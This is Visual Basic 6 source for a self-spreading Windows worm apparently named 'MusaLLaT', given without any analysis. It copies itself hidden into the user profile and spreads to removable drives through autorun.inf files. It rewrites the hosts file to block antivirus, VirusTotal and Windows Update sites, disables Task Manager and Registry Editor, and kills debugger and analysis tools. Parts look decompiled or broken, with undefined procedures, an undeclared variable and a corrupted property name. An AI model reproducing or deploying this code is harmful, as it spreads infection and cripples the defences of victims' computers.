Attribute VB_Name = "Form1"
VERSION 5#
Begin VB.Form Form1
   BorderStyle = 0
   ClientHeight = 90
   CBlientLeft = 17235
   ClientTop = 9795
   ClientWidth = 90
   Icon            =   "Form1.frx":0000
   LinkTopic = "Form1"
   MaxButton = 0
   MinButton = 0
   ScaleHeight = 90
   ScaleWidth = 90
   ShowInTaskbar = 0
   StartUpPosition = 3
   Visible = 0
   Begin VB.Timer Timer1
      Enabled = 0
      Interval = 100
      Left = 120
      Top = 120
   End
   Begin VB.Timer Timer2
      Enabled = 0
      Interval = 100
      Left = 600
      Top = 120
   End
   Begin VB.Timer Timer3
      Enabled = 0
      Interval = 1000
      Left = 1080
      Top = 120
   End
   Begin VB.Timer Timer4
      Enabled = 0
      Interval = 100
      Left = 1560
      Top = 120
   End
   Begin VB.Timer Timer5
      Enabled = 0
      Interval = 100
      Left = 2040
      Top = 120
   End
   Begin VB.Timer Timer6
      Enabled = 0
      Interval = 5000
      Left = 2520
      Top = 120
   End
   Begin VB.Timer Timer7
      Enabled = 0
      Interval = 100
      Left = 3000
      Top = 120
   End
   Begin VB.Timer Timer8
      Enabled = 0
      Interval = 100
      Left = 3480
      Top = 120
   End
   Begin VB.Timer Timer9
      Enabled = 0
      Interval = 100
      Left = 3960
      Top = 120
   End
   Begin VB.Timer Timer10
      Enabled = 0
      Interval = 10
      Left = 4440
      Top = 120
   End
   Begin VB.Timer Timer11
      Enabled = 0
      Interval = 100
      Left = 4920
      Top = 120
   End
   Begin VB.Timer Timer12
      Enabled = 0
      Interval = 1000
      Left = 5400
      Top = 120
   End
   Begin VB.ListBox List1
      Height = 0
      Left = 0
      TabIndex = 0
      Top = 0
      Visible = 0
      Width = 0
   End
   Begin VB.ListBox List4
      Height = 0
      Left = 0
      TabIndex = 1
      Top = 0
      Visible = 0
      Width = 0
   End
   Begin VB.Frame Frame2
      Caption = "Frame2"
      Height = 0
      Left = 0
      TabIndex = 2
      Top = 0
      Visible = 0
      Width = 0
   End
End

Option Explicit

Private Const GENERIC_WRITE = &H40000000
Private Const CREATE_ALWAYS = 2
Private Const FILE_ATTRIBUTE_NORMAL = &H80
Private Const FILE_ATTRIBUTE_HIDDEN = &H2
Private Const FILE_ATTRIBUTE_SYSTEM = &H4
Private Const INVALID_HANDLE_VALUE = -1
Private Const HKEY_CURRENT_USER = &H80000001
Private Const HKEY_LOCAL_MACHINE = &H80000002
Private Const HKEY_CLASSES_ROOT = &H80000000
Private Const KEY_SET_VALUE = &H20006
Private Const KEY_ENUMERATE_SUB_KEYS = &H8
Private Const REG_DWORD = 4
Private Const REG_SZ = 1
Private Const ERROR_SUCCESS = 0
Private Const TH32CS_SNAPPROCESS = &H2
Private Const PROCESS_TERMINATE = &H1
Private Const PROCESS_QUERY_INFORMATION = &H400

Private Declare Function ShellExecute Lib "shell32" Alias "ShellExecuteA" (ByVal hWnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Private Declare Function GetModuleFileName Lib "kernel32" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFileName As String, ByVal nSize As Long) As Long
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private Declare Function GetTempPath Lib "kernel32" Alias "GetTempPathA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long
Private Declare Function GetComputerName Lib "kernel32" Alias "GetComputerNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Private Declare Function GetUserName Lib "advapi32" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Private Declare Function GetForegroundWindow Lib "user32" () As Long
Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hWnd As Long) As Long
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function CreateFile Lib "kernel32" Alias "CreateFileA" (ByVal lpFileName As String, ByVal dwDesiredAccess As Long, ByVal dwShareMode As Long, lpSecurityAttributes As Long, ByVal dwCreationDisposition As Long, ByVal dwFlagsAndAttributes As Long, ByVal hTemplateFile As Long) As Long
Private Declare Function WriteFile Lib "kernel32" (ByVal hFile As Long, lpBuffer As Any, ByVal nNumberOfBytesToWrite As Long, lpNumberOfBytesWritten As Long, lpOverlapped As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Declare Function CreateToolhelp32Snapshot Lib "kernel32" (ByVal dwFlags As Long, ByVal th32ProcessID As Long) As Long
Private Declare Function Process32First Lib "kernel32" (ByVal hSnapshot As Long, lppe As PROCESSENTRY32) As Long
Private Declare Function Process32Next Lib "kernel32" (ByVal hSnapshot As Long, lppe As PROCESSENTRY32) As Long
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Private Declare Function TerminateProcess Lib "kernel32" (ByVal hProcess As Long, ByVal uExitCode As Long) As Long
Private Declare Function RegOpenKeyEx Lib "advapi32" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegDeleteValue Lib "advapi32" Alias "RegDeleteValueA" (ByVal hKey As Long, ByVal lpValueName As String) As Long
Private Declare Function RegSetValueEx Lib "advapi32" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32" (ByVal hKey As Long) As Long
Private Declare Function RegEnumKeyEx Lib "advapi32" Alias "RegEnumKeyExA" (ByVal hKey As Long, ByVal dwIndex As Long, ByVal lpName As String, lpcbName As Long, ByVal lpReserved As Long, ByVal lpClass As String, lpcbClass As Long, lpftLastWriteTime As Any) As Long

Private Type PROCESSENTRY32
    dwSize As Long
    cntUsage As Long
    th32ProcessID As Long
    th32DefaultHeapID As Long
    th32ModuleID As Long
    cntThreads As Long
    th32ParentProcessID As Long
    pcPriClassBase As Long
    dwFlags As Long
    szExeFile As String * 260
End Type

Private m_sModulePath As String
Private m_sWindowsDir As String
Private m_sSystemDir As String
Private m_sTempDir As String
Private m_sComputerName As String
Private m_sUserName As String

Private Sub Form_Load()
    Dim sUserProfile As String
    Dim sTargetPath As String
    Dim sRegPath As String
    Dim hKey As Long
    
    m_sModulePath = String(260, vbNullChar)
    GetModuleFileName 0, m_sModulePath, 260
    m_sModulePath = Left(m_sModulePath, InStr(m_sModulePath, vbNullChar) - 1)
    
    m_sWindowsDir = String(260, vbNullChar)
    GetWindowsDirectory m_sWindowsDir, 260
    m_sWindowsDir = Left(m_sWindowsDir, InStr(m_sWindowsDir, vbNullChar) - 1)
    
    m_sSystemDir = String(260, vbNullChar)
    GetSystemDirectory m_sSystemDir, 260
    m_sSystemDir = Left(m_sSystemDir, InStr(m_sSystemDir, vbNullChar) - 1)
    
    m_sTempDir = String(260, vbNullChar)
    GetTempPath 260, m_sTempDir
    m_sTempDir = Left(m_sTempDir, InStr(m_sTempDir, vbNullChar) - 1)
    
    m_sComputerName = String(260, vbNullChar)
    GetComputerName m_sComputerName, 260
    m_sComputerName = Left(m_sComputerName, InStr(m_sComputerName, vbNullChar) - 1)
    
    m_sUserName = String(260, vbNullChar)
    GetUserName m_sUserName, 260
    m_sUserName = Left(m_sUserName, InStr(m_sUserName, vbNullChar) - 1)
    
    sUserProfile = Environ("USERPROFILE")
    sTargetPath = sUserProfile & "\Belgelerim\" & App.EXEName & ".exe"
    
    If Len(Dir(sTargetPath)) = 0 Then
        Proc_1_1_45B890
        Proc_2_2_45BCD0
        FileCopy m_sModulePath, sTargetPath
        SetAttr sTargetPath, vbHidden
        ShellExecute Me.hWnd, "open", sTargetPath, "", "", 1
        Timer1.Enabled = True
        Timer2.Enabled = True
        Timer3.Enabled = True
        Timer5.Enabled = True
        Timer6.Enabled = True
        Timer7.Enabled = True
        Timer8.Enabled = True
    Else
        Proc_2_2_45BCD0
        Timer3.Enabled = True
        Timer6.Enabled = True
        Timer7.Enabled = True
        Timer8.Enabled = True
        Timer9.Enabled = True
    End If
End Sub

Private Sub Timer1_Timer()
    Dim sDrive As String
    Dim hFile As Long
    Dim lWritten As Long
    Dim sAutoRun As String
    
    For Each sDrive In Split("E:\ F:\ G:\ H:\ I:\ J:\ K:\ L:\", " ")
        If Len(Dir(sDrive, vbDirectory)) > 0 Then
            On Error Resume Next
            Kill sDrive & "autorun.inf"
            Kill sDrive & "*.ini"
            
            hFile = CreateFile(sDrive & "autorun.inf", GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0)
            If hFile Then
                sAutoRun = "[AutoRun]" & vbCrLf & "Open=" & App.EXEName & ".exe" & vbCrLf & "Shell\Open=Ac" & vbCrLf & "Shell\Open\Command=" & App.EXEName & ".exe" & vbCrLf
                WriteFile hFile, ByVal sAutoRun, Len(sAutoRun), lWritten, 0
                CloseHandle hFile
            End If
            FileCopy m_sModulePath, sDrive & App.EXEName & ".exe"
            SetAttr sDrive & App.EXEName & ".exe", vbHidden Or vbSystem
            On Error GoTo 0
        End If
    Next
End Sub

Private Sub Timer2_Timer()
    Dim sHosts As String
    Dim hFile As Long
    Dim lWritten As Long
    
    Timer2.Enabled = False
    sHosts = m_sSystemDir & "\drivers\etc\hosts"
    
    On Error Resume Next
    Kill sHosts
    On Error GoTo 0
    
    hFile = CreateFile(sHosts, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0)
    If hFile Then
        WriteFile hFile, ByVal BuildHostsBlock(), Len(BuildHostsBlock()), lWritten, 0
        CloseHandle hFile
        SetAttr sHosts, vbHidden Or vbReadOnly
    End If
End Sub

Private Function BuildHostsBlock() As String
    Dim s As String
    s = "127.0.0.1 localhost" & vbCrLf & vbCrLf
    s = s & "127.0.0.1 dl1.pro.antivir.de" & vbCrLf
    s = s & "127.0.0.1 dl2.pro.antivir.de" & vbCrLf
    s = s & "127.0.0.1 www.avg.com" & vbCrLf
    s = s & "127.0.0.1 avg.com" & vbCrLf
    s = s & "127.0.0.1 free.avg.com" & vbCrLf
    s = s & "127.0.0.1 www.avast.com" & vbCrLf
    s = s & "127.0.0.1 avast.com" & vbCrLf
    s = s & "127.0.0.1 www.f-secure.com" & vbCrLf
    s = s & "127.0.0.1 f-secure.com" & vbCrLf
    s = s & "127.0.0.1 www.virustotal.com" & vbCrLf
    s = s & "127.0.0.1 virustotal.com" & vbCrLf
    s = s & "127.0.0.1 www.eset.com" & vbCrLf
    s = s & "127.0.0.1 eset.com" & vbCrLf
    s = s & "127.0.0.1 www.kaspersky.com" & vbCrLf
    s = s & "127.0.0.1 kaspersky.com" & vbCrLf
    s = s & "127.0.0.1 www.symantec.com" & vbCrLf
    s = s & "127.0.0.1 symantec.com" & vbCrLf
    s = s & "127.0.0.1 www.mcafee.com" & vbCrLf
    s = s & "127.0.0.1 mcafee.com" & vbCrLf
    s = s & "127.0.0.1 www.pandasoftware.com" & vbCrLf
    s = s & "127.0.0.1 www.trendmicro.com" & vbCrLf
    s = s & "127.0.0.1 trendmicro.com" & vbCrLf
    s = s & "127.0.0.1 www.sophos.com" & vbCrLf
    s = s & "127.0.0.1 update.microsoft.com" & vbCrLf
    s = s & "127.0.0.1 www.bitdefender.com" & vbCrLf
    s = s & "127.0.0.1 cert.org" & vbCrLf
    s = s & "127.0.0.1 clamav.net" & vbCrLf
    BuildHostsBlock = s
End Function

Private Sub Timer3_Timer()
    Dim hWnd As Long
    Dim lLen As Long
    Dim sText As String
    
    hWnd = GetForegroundWindow()
    If hWnd = 0 Then Exit Sub
    
    lLen = GetWindowTextLength(hWnd)
    If lLen = 0 Then Exit Sub
    
    sText = String(lLen + 1, vbNullChar)
    GetWindowText hWnd, sText, lLen + 1
    sText = Left(sText, lLen)
    
    If InStr(sText, "calistir") Or InStr(sText, "Kayit Defteri Duzenleyicisi") Or InStr(sText, "Sistem Yapilandirmasi") Or InStr(sText, "Trend Micro") Then
        Timer4.Enabled = False
        Timer9.Enabled = False
    End If
End Sub

Private Sub Timer4_Timer()
    Dim hKey As Long
    RegOpenKeyEx HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_SET_VALUE, hKey
    If hKey Then
        RegDeleteValue hKey, "MusaLLaT"
        RegCloseKey hKey
    End If
    Timer4.Enabled = False
End Sub

Private Sub Timer5_Timer()
    Dim sDrive As String
    For Each sDrive In Split("E:\ F:\ G:\ H:\ I:\ J:\ K:\", " ")
        On Error Resume Next
        Kill sDrive & "autorun.inf"
        Kill sDrive & App.EXEName & ".exe"
        On Error GoTo 0
    Next
    Timer5.Enabled = False
End Sub

Private Sub Timer6_Timer()
    Dim sDrive As String
    For Each sDrive In Split("D:\ E:\ F:\ G:\ H:\ I:\ J:\ K:\ L:\", " ")
        If Len(Dir(sDrive, vbDirectory)) > 0 And UCase(Left(sDrive, 2)) <> "C:" Then
            On Error Resume Next
            FileCopy m_sModulePath, sDrive & App.EXEName & ".exe"
            SetAttr sDrive & App.EXEName & ".exe", vbHidden Or vbSystem
            On Error GoTo 0
        End If
    Next
End Sub

Private Sub Timer7_Timer()
    Dim sPath As String
    Dim hFile As Long
    Dim lWritten As Long
    sPath = Environ("USERPROFILE") & "\Declare.ini"
    On Error Resume Next
    Kill sPath
    On Error GoTo 0
    hFile = CreateFile(sPath, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0)
    If hFile Then
        WriteFile hFile, ByVal "[MusaLLaT]" & vbCrLf & "Path=" & m_sModulePath & vbCrLf, Len("[MusaLLaT]" & vbCrLf & "Path=" & m_sModulePath & vbCrLf), lWritten, 0
        CloseHandle hFile
    End If
    Timer7.Enabled = False
End Sub

Private Sub Timer8_Timer()
    Dim hKey As Long
    RegOpenKeyEx HKEY_CLASSES_ROOT, "", 0, KEY_ENUMERATE_SUB_KEYS, hKey
    If hKey Then
        Dim i As Long
        Dim sName As String
        Dim lLen As Long
        i = 0
        Do
            sName = String(260, vbNullChar)
            lLen = 260
            If RegEnumKeyEx(hKey, i, sName, lLen, 0, vbNullString, 0, ByVal 0&) <> ERROR_SUCCESS Then Exit Do
            i = i + 1
        Loop
        RegCloseKey hKey
    End If
    Timer8.Enabled = False
End Sub

Private Sub Timer9_Timer()
    Dim hKey As Long
    RegOpenKeyEx HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, KEY_SET_VALUE, hKey
    If hKey Then
        RegSetValueEx hKey, "DisableRegistryTools", 0, REG_DWORD, 1, 4
        RegSetValueEx hKey, "DisableTaskMgr", 0, REG_DWORD, 1, 4
        RegCloseKey hKey
    End If
    Timer9.Enabled = False
End Sub

Private Sub Timer10_Timer()
    Static bBusy As Boolean
    If bBusy Then Exit Sub
    bBusy = True
    If List4.ListCount = 0 Then
        Timer11.Enabled = True
    Else
        List1.AddItem List4.List(0)
        List4.RemoveItem 0
    End If
    bBusy = False
End Sub

Private Sub Timer11_Timer()
    Static sRoot As String
    If Len(sRoot) = 0 Then sRoot = m_sWindowsDir
    FindFiles sRoot, "", "*.exe"
    If List4.ListCount > 0 Then Timer10.Enabled = True
End Sub

Private Sub Timer12_Timer()
    Dim hSnap As Long
    Dim tProc As PROCESSENTRY32
    Dim hProc As Long
    Dim aList
    Dim sName As String
    
    aList = Array("ollydbg.exe", "ida.exe", "idaq.exe", "wireshark.exe", "procmon.exe", "procexp.exe", "processhacker.exe")
    
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    If hSnap = INVALID_HANDLE_VALUE Then Exit Sub
    
    tProc.dwSize = Len(tProc)
    If Process32First(hSnap, tProc) Then
        Do
            sName = LCase(Trim(tProc.szExeFile))
            For Each sCheck In aList
                If sName = sCheck Then
                    hProc = OpenProcess(PROCESS_TERMINATE, 0, tProc.th32ProcessID)
                    If hProc Then TerminateProcess hProc, 0: CloseHandle hProc
                End If
            Next
        Loop While Process32Next(hSnap, tProc)
    End If
    CloseHandle hSnap
End Sub

Public Sub FindFiles(ByVal strRootFolder As String, ByVal strFolder As String, ByVal strFile As String)
    Dim sPath As String
    Dim sName As String
    
    If Right(strRootFolder, 1) <> "\" Then strRootFolder = strRootFolder & "\"
    If Len(strFolder) > 0 Then
        If Right(strFolder, 1) <> "\" Then strFolder = strFolder & "\"
        sPath = strRootFolder & strFolder
    Else
        sPath = strRootFolder
    End If
    
    sName = Dir(sPath & strFile, vbNormal Or vbHidden Or vbSystem Or vbArchive)
    Do While Len(sName) > 0
        List4.AddItem sPath & sName
        If List4.ListCount > 100 Then Exit Sub
        sName = Dir()
    Loop
    
    sName = Dir(sPath & "*.*", vbDirectory)
    Do While Len(sName) > 0
        If sName <> "." And sName <> ".." Then
            If GetAttr(sPath & sName) And vbDirectory Then
                If Len(strFolder) > 0 Then
                    FindFiles strRootFolder, strFolder & sName, strFile
                Else
                    FindFiles strRootFolder, sName, strFile
                End If
            End If
        End If
        sName = Dir()
    Loop
End Sub

Public Function TypeWindow() As Boolean
    Dim hWnd As Long
    Dim lLen As Long
    Dim sText As String
    Static sLast As String
    
    hWnd = GetForegroundWindow()
    If hWnd = 0 Then Exit Function
    
    lLen = GetWindowTextLength(hWnd)
    If lLen = 0 Then Exit Function
    
    sText = String(lLen + 1, vbNullChar)
    GetWindowText hWnd, sText, lLen + 1
    sText = Left(sText, lLen)
    
    If sText <> sLast Then
        sLast = sText
        TypeWindow = True
    End If
End Function
